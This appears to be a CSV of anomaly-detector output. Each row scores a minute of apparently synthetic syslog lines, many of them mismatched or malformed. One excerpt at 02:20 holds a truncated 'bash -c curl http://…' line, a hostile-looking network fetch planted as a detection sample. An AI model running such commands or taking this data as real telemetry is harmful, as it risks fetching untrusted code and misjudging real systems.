bucket,early_warning_score,predict_raw,predict_confirmed,threshold,k_confirm,lines,example_text
2026-07-01 01:34:00,0.9996512000230905,1,1,0.8224995273096307,3,57,ntpd: Started Cleanup of Temporary Directories. || cups: Synced RTC time from system clock. || dockerd: Finished Daily apt download activities. || redis-server: Started Session c88 of user root. || chronyd: EXT4-fs error (device sda1): ext4_find_entr
2026-07-01 01:35:00,0.9999239835520234,1,1,0.8224995273096307,3,57,redis-server: Accepted publickey for user from 10.0.0.109 port 22 ssh2. || sshd: Listening on LVM2 poll daemon socket. || docker: kernel: Out of memory: Kill process 46442 (python3) score 987 or sacrifice child || systemd: Synced RTC time from system
2026-07-01 01:36:00,0.9999913784729425,1,1,0.8224995273096307,3,64,ntpd: Started Cleanup of Temporary Directories. || named: Rotating log files. || systemd: Listening on LVM2 poll daemon socket. || ftpd: Rotating log files. || unix_chkpwd: Rotating log files. || ftpd: Started Session c185 of user root. || ftpd: Star
2026-07-01 01:37:00,0.9991948883828355,1,1,0.8224995273096307,3,60,dockerd: Synced RTC time from system clock. || telnetd: Finished Daily apt download activities. || named: Finished Daily apt download activities. || CRON: Rotating log files. || ufw: Started Session c209 of user root. || ntpd: Rotating log files. || 
2026-07-01 01:38:00,0.998265651685578,1,1,0.8224995273096307,3,61,NetworkManager: Rotating log files. || docker: Synced RTC time from system clock. || NetworkManager: Started Session c9 of user root. || ufw: Finished Daily apt download activities. || docker: Started Session c5 of user root. || telnetd: Started CUPS
2026-07-01 01:39:00,0.9999972079113904,1,1,0.8224995273096307,3,60,chronyd: Started Session c67 of user root. || cups: Synced RTC time from system clock. || systemd-timesyncd: Rotating log files. || dockerd: Finished Daily apt download activities. || chronyd: Listening on LVM2 poll daemon socket. || unix_chkpwd: Fin
2026-07-01 01:40:00,0.9999999051907368,1,1,0.8224995273096307,3,56,smartd: Started Cleanup of Temporary Directories. || dockerd: Accepted publickey for user from 10.0.0.239 port 22 ssh2. || sshd: Accepted publickey for user from 10.0.0.92 port 22 ssh2. || xinetd: Started Cleanup of Temporary Directories. || redis-se
2026-07-01 01:41:00,0.9999995270496144,1,1,0.8224995273096307,3,57,telnetd: Started Session c80 of user root. || ntpd: Accepted publickey for user from 10.0.0.136 port 22 ssh2. || ntpd: Finished Daily apt download activities. || redis-server: Started CUPS Scheduler. || kernel: Started CUPS Scheduler. || docker: List
2026-07-01 01:42:00,0.9999999046274684,1,1,0.8224995273096307,3,61,telnetd: kernel: Out of memory: Kill process 23361 (python3) score 987 or sacrifice child || sshd: Started Session c113 of user root. || docker: Listening on LVM2 poll daemon socket. || docker: Finished Daily apt download activities. || named: Accept
2026-07-01 01:43:00,0.9999991432550212,1,1,0.8224995273096307,3,62,systemd: Listening on LVM2 poll daemon socket. || ufw: Started Cleanup of Temporary Directories. || redis-server: Accepted publickey for user from 10.0.0.64 port 22 ssh2. || ntpd: Rotating log files. || chronyd: Accepted publickey for user from 10.0.
2026-07-01 01:44:00,0.9999929665529435,1,1,0.8224995273096307,3,59,named: Started Cleanup of Temporary Directories. || smartd: Finished Daily apt download activities. || unix_chkpwd: Synced RTC time from system clock. || redis-server: Started CUPS Scheduler. || sudo: Accepted publickey for user from 10.0.0.2 port 22
2026-07-01 01:45:00,0.9999999937366126,1,1,0.8224995273096307,3,61,docker: Accepted publickey for user from 10.0.0.176 port 22 ssh2. || sudo: Accepted publickey for user from 10.0.0.50 port 22 ssh2. || unattended-upgrades: Accepted publickey for user from 10.0.0.182 port 22 ssh2. || kernel: Started CUPS Scheduler. |
2026-07-01 01:46:00,0.9999999825601992,1,1,0.8224995273096307,3,63,ftpd: Accepted publickey for user from 10.0.0.210 port 22 ssh2. || ufw: Started Cleanup of Temporary Directories. || rsyslogd: Synced RTC time from system clock. || kernel: Listening on LVM2 poll daemon socket. || sudo: Started CUPS Scheduler. || red
2026-07-01 01:47:00,0.9999959298851706,1,1,0.8224995273096307,3,58,ftpd: Listening on LVM2 poll daemon socket. || redis-server: Finished Daily apt download activities. || systemd-timesyncd: Started Cleanup of Temporary Directories. || chronyd: Started Session c219 of user root. || rsyslogd: Started CUPS Scheduler. |
2026-07-01 01:48:00,0.9999808278584698,1,1,0.8224995273096307,3,63,xinetd: Started Session c110 of user root. || unattended-upgrades: kernel: Out of memory: Kill process 63180 (python3) score 987 or sacrifice child || telnetd: Finished Daily apt download activities. || unix_chkpwd: Accepted publickey for user from 1
2026-07-01 01:49:00,0.9997357250872422,1,1,0.8224995273096307,3,65,ufw: Accepted publickey for user from 10.0.0.206 port 22 ssh2. || redis-server: Rotating log files. || rsyslogd: Listening on LVM2 poll daemon socket. || redis-server: Listening on LVM2 poll daemon socket. || systemd: Started Cleanup of Temporary Dir
2026-07-01 01:50:00,0.9999056390428523,1,1,0.8224995273096307,3,58,CRON: Started Session c223 of user root. || dockerd: Listening on LVM2 poll daemon socket. || ufw: Started CUPS Scheduler. || dockerd: Finished Daily apt download activities. || gpm: Listening on LVM2 poll daemon socket. || systemd: Listening on LVM2
2026-07-01 01:51:00,0.9986455580268109,1,1,0.8224995273096307,3,59,chronyd: Started Cleanup of Temporary Directories. || redis-server: Started CUPS Scheduler. || sudo: Accepted publickey for user from 10.0.0.93 port 22 ssh2. || chronyd: Accepted publickey for user from 10.0.0.48 port 22 ssh2. || rsyslogd: Started CU
2026-07-01 01:52:00,0.9949233149231947,1,1,0.8224995273096307,3,62,ftpd: Started Cleanup of Temporary Directories. || redis-server: Synced RTC time from system clock. || chronyd: Started Session c138 of user root. || unix_chkpwd: Accepted publickey for user from 10.0.0.73 port 22 ssh2. || kernel: Accepted publickey 
2026-07-01 01:53:00,0.9986755701588881,1,1,0.8224995273096307,3,58,docker: Started Session c223 of user root. || ftpd: Started Cleanup of Temporary Directories. || kernel: Accepted publickey for user from 10.0.0.12 port 22 ssh2. || ftpd: Started CUPS Scheduler. || chronyd: Listening on LVM2 poll daemon socket. || rs
2026-07-01 01:54:00,0.9999999352423883,1,1,0.8224995273096307,3,61,smartd: Rotating log files. || sudo: Listening on LVM2 poll daemon socket. || systemd-timesyncd: Synced RTC time from system clock. || dockerd: Started CUPS Scheduler. || systemd: Finished Daily apt download activities. || chronyd: Started Cleanup of
2026-07-01 01:55:00,0.9999999489389416,1,1,0.8224995273096307,3,61,chronyd: Listening on LVM2 poll daemon socket. || telnetd: Listening on LVM2 poll daemon socket. || sshd: EXT4-fs error (device sda1): ext4_find_entry:1455: inode #2: comm ls: reading directory lblock 0 || kernel: Synced RTC time from system clock. |
2026-07-01 01:56:00,0.9999992148782786,1,1,0.8224995273096307,3,59,systemd: Started Session c26 of user root. || ntpd: Finished Daily apt download activities. || cups: Rotating log files. || xinetd: Started CUPS Scheduler. || smartd: Started CUPS Scheduler. || sudo: Synced RTC time from system clock. || systemd: Syn
2026-07-01 01:57:00,0.999997794875854,1,1,0.8224995273096307,3,58,named: Rotating log files. || gpm: kernel: Kernel panic - not syncing: Fatal exception || telnetd: app[1234]: segfault at 0 ip 00007f stackpointer error 4 in lib.so[7f000] (core dumped) || systemd: Listening on LVM2 poll daemon socket. || NetworkMana
2026-07-01 01:58:00,0.9999999823014135,1,1,0.8224995273096307,3,62,NetworkManager: Rotating log files. || kernel: Rotating log files. || sudo: Rotating log files. || NetworkManager: Synced RTC time from system clock. || logrotate: Started Session c123 of user root. || cups: Started Cleanup of Temporary Directories. 
2026-07-01 01:59:00,0.9999999695487338,1,1,0.8224995273096307,3,58,ufw: Synced RTC time from system clock. || unix_chkpwd: Accepted publickey for user from 10.0.0.9 port 22 ssh2. || docker: Finished Daily apt download activities. || docker: Finished Daily apt download activities. || unattended-upgrades: Started Sess
2026-07-01 02:00:00,0.9999998386614655,1,1,0.8224995273096307,3,63,cups: Started Session c82 of user root. || logrotate: Accepted publickey for user from 10.0.0.79 port 22 ssh2. || sudo: Listening on LVM2 poll daemon socket. || ufw: Started CUPS Scheduler. || cups: Listening on LVM2 poll daemon socket. || ftpd: Sync
2026-07-01 02:01:00,0.999999694328358,1,1,0.8224995273096307,3,61,xinetd: Synced RTC time from system clock. || cups: [UFW BLOCK] IN=eth0 OUT= MAC= SRC=1.2.3.32849 DST=10.0.0.1 LEN=60 TOS=0x00 PREC=0x00 TTL=53 || sshd: Started CUPS Scheduler. || docker: Accepted publickey for user from 10.0.0.131 port 22 ssh2. || f
2026-07-01 02:02:00,0.9999626447663904,1,1,0.8224995273096307,3,63,smartd: Started Session c202 of user root. || ufw: Finished Daily apt download activities. || redis-server: Accepted publickey for user from 10.0.0.61 port 22 ssh2. || sudo: Finished Daily apt download activities. || unix_chkpwd: Started CUPS Schedul
2026-07-01 02:03:00,0.9994617305182345,1,1,0.8224995273096307,3,61,gpm: Finished Daily apt download activities. || rsyslogd: Listening on LVM2 poll daemon socket. || kernel: Started Session c51 of user root. || smartd: Listening on LVM2 poll daemon socket. || ntpd: Started Session c189 of user root. || redis-server:
2026-07-01 02:04:00,0.9924312459043124,1,1,0.8224995273096307,3,62,telnetd: Rotating log files. || NetworkManager: Started Session c49 of user root. || ntpd: Started CUPS Scheduler. || ufw: Finished Daily apt download activities. || telnetd: Finished Daily apt download activities. || gpm: Synced RTC time from system
2026-07-01 02:05:00,0.9967155645639827,1,1,0.8224995273096307,3,60,telnetd: Finished Daily apt download activities. || cups: Finished Daily apt download activities. || docker: Finished Daily apt download activities. || CRON: Rotating log files. || rsyslogd: Rotating log files. || systemd-timesyncd: Listening on LVM2
2026-07-01 02:06:00,0.9988027640155049,1,1,0.8224995273096307,3,63,systemd: Rotating log files. || CRON: Finished Daily apt download activities. || systemd-timesyncd: Started CUPS Scheduler. || docker: Started Session c248 of user root. || dockerd: Started CUPS Scheduler. || systemd-timesyncd: Listening on LVM2 poll
2026-07-01 02:07:00,0.9845883897811547,1,1,0.8224995273096307,3,56,rsyslogd: Started Session c79 of user root. || ntpd: kernel: Out of memory: Kill process 670 (python3) score 987 or sacrifice child || CRON: Started Cleanup of Temporary Directories. || kernel: Listening on LVM2 poll daemon socket. || chronyd: Finish
2026-07-01 02:08:00,0.9886099931756608,1,1,0.8224995273096307,3,61,unix_chkpwd: Started Cleanup of Temporary Directories. || sshd: Accepted publickey for user from 10.0.0.28 port 22 ssh2. || NetworkManager: Listening on LVM2 poll daemon socket. || ntpd: Started Cleanup of Temporary Directories. || dockerd: Listening
2026-07-01 02:09:00,0.9957986760176076,1,1,0.8224995273096307,3,62,smartd: Finished Daily apt download activities. || docker: Started CUPS Scheduler. || gpm: Finished Daily apt download activities. || CRON: Finished Daily apt download activities. || kernel: Started Cleanup of Temporary Directories. || systemd-timesy
2026-07-01 02:10:00,0.9966908333379032,1,1,0.8224995273096307,3,63,telnetd: Finished Daily apt download activities. || ufw: Started Session c181 of user root. || docker: Rotating log files. || unattended-upgrades: Finished Daily apt download activities. || unattended-upgrades: Accepted publickey for user from 10.0.0
2026-07-01 02:11:00,0.9957199042971617,1,1,0.8224995273096307,3,61,docker: Accepted publickey for user from 10.0.0.85 port 22 ssh2. || chronyd: kernel: Kernel panic - not syncing: Fatal exception || named: Synced RTC time from system clock. || CRON: Started Session c79 of user root. || unattended-upgrades: Started C
2026-07-01 02:12:00,0.9999943019443638,1,1,0.8224995273096307,3,55,dockerd: Started CUPS Scheduler. || redis-server: Rotating log files. || ftpd: app[1234]: segfault at 0 ip 00007f stackpointer error 4 in lib.so[7f000] (core dumped) || ufw: Accepted publickey for user from 10.0.0.28 port 22 ssh2. || chronyd: Started
2026-07-01 02:13:00,0.9999998752297232,1,1,0.8224995273096307,3,60,unix_chkpwd: Started Session c27 of user root. || dockerd: Started Session c67 of user root. || ufw: Accepted publickey for user from 10.0.0.201 port 22 ssh2. || NetworkManager: Listening on LVM2 poll daemon socket. || ftpd: Started Session c203 of u
2026-07-01 02:14:00,0.9999958945213335,1,1,0.8224995273096307,3,58,systemd-timesyncd: Started Cleanup of Temporary Directories. || ntpd: Started Cleanup of Temporary Directories. || ftpd: Started Session c223 of user root. || unix_chkpwd: Started Session c181 of user root. || CRON: Started Session c12 of user root. 
2026-07-01 02:15:00,0.9999840835529508,1,1,0.8224995273096307,3,59,NetworkManager: Started Cleanup of Temporary Directories. || xinetd: Accepted publickey for user from 10.0.0.229 port 22 ssh2. || chronyd: Accepted publickey for user from 10.0.0.17 port 22 ssh2. || chronyd: Started CUPS Scheduler. || docker: Started
2026-07-01 02:16:00,0.9999857864198393,1,1,0.8224995273096307,3,59,sudo: Started CUPS Scheduler. || unix_chkpwd: Started Session c237 of user root. || xinetd: Started Cleanup of Temporary Directories. || docker: Rotating log files. || dockerd: Finished Daily apt download activities. || sudo: Started Cleanup of Tempo
2026-07-01 02:17:00,0.999835412158325,1,1,0.8224995273096307,3,63,smartd: Listening on LVM2 poll daemon socket. || telnetd: Accepted publickey for user from 10.0.0.144 port 22 ssh2. || telnetd: Listening on LVM2 poll daemon socket. || sshd: Synced RTC time from system clock. || docker: Started Cleanup of Temporary 
2026-07-01 02:18:00,0.9987235667990109,1,1,0.8224995273096307,3,60,docker: Accepted publickey for user from 10.0.0.154 port 22 ssh2. || smartd: Synced RTC time from system clock. || systemd-timesyncd: Synced RTC time from system clock. || smartd: Synced RTC time from system clock. || sudo: Synced RTC time from syste
2026-07-01 02:19:00,0.9994610451983628,1,1,0.8224995273096307,3,60,NetworkManager: Synced RTC time from system clock. || logrotate: Started Session c254 of user root. || ftpd: Accepted publickey for user from 10.0.0.243 port 22 ssh2. || sshd: Listening on LVM2 poll daemon socket. || CRON: Accepted publickey for user
2026-07-01 02:20:00,0.9995297386946622,1,1,0.8224995273096307,3,62,smartd: Started Session c3 of user root. || rsyslogd: Finished Daily apt download activities. || smartd: Accepted publickey for user from 10.0.0.246 port 22 ssh2. || systemd: Started Session c141 of user root. || sshd: bash: -c: line 1: curl http://b
2026-07-01 02:21:00,0.999082773406707,1,1,0.8224995273096307,3,59,docker: Started Cleanup of Temporary Directories. || redis-server: Started CUPS Scheduler. || smartd: Started CUPS Scheduler. || ntpd: Started Session c84 of user root. || ftpd: Accepted publickey for user from 10.0.0.122 port 22 ssh2. || rsyslogd: S
